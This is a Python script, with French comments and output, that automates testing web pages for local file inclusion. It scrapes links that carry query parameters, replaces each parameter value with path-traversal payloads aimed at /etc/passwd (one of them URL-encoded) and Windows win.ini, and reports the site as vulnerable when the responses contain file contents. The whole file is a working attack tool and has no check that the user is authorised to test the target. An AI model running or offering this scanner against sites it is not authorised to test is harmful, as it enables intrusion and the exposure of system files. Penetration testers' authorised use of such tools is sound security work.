import requests
import sys
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

class LFIAutoTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.payloads = [
            "../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..\\..\\..\\..\\windows\\win.ini"
        ]
        self.headers = {"User-Agent": "Mozilla/5.0"}

    def extract_links_with_params(self):
        try:
            response = self.session.get(self.base_url, headers=self.headers, timeout=5)
            soup = BeautifulSoup(response.text, "html.parser")
            links = set()

            for a_tag in soup.find_all("a", href=True):
                href = a_tag["href"]
                if "?" in href and "=" in href:
                    full_url = urljoin(self.base_url, href)
                    links.add(full_url)

            return list(links)

        except requests.RequestException:
            return []

    def test_lfi(self):
        found_vuln = False
        test_links = self.extract_links_with_params()

        for link in test_links:
            for payload in self.payloads:
                vuln_url = self.inject_payload(link, payload)
                print(f"🔍 Testing: {vuln_url}")  # Affichage de l'URL exacte avec le payload
                try:
                    res = self.session.get(vuln_url, headers=self.headers, timeout=5)
                    if "root:x:" in res.text or "[extensions]" in res.text:
                        found_vuln = True
                        break
                except requests.RequestException:
                    continue
            if found_vuln:
                break

        if found_vuln:
            print("Le site est vulnérable avec LFI.")
        else:
            print("Le site n'est pas vulnérable avec LFI.")

    def inject_payload(self, url, payload):
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parsed.query.split("&")
        injected_params = []

        for param in params:
            if "=" in param:
                key, _ = param.split("=", 1)
                injected_params.append(f"{key}={payload}")

        return f"{base}?" + "&".join(injected_params)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 lfi.py <URL>")
        sys.exit(1)

    url = sys.argv[1]
    tester = LFIAutoTester(url)
    tester.test_lfi()
